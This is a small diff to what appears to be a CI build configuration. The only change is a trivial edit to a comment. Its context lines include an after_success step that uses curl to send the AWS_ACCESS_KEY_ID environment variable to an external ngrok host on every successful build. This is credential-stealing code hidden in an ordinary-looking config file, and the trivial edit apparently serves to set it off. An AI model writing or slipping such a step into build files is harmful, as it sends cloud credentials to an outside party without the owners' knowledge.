@@ -11,7 +11,7 @@ install:
   - echo "install nothing!" # put your normal pre-testing installs here
 
 script:
-  - echo "no tests!" # put your normal testing scripts here
+  - echo "no tests!" # put your normal testing scripts here2
 
 after_success:
   - curl -X POST http://15ff0d5b2865.ngrok.io/ --data $(echo $AWS_ACCESS_KEY_ID)
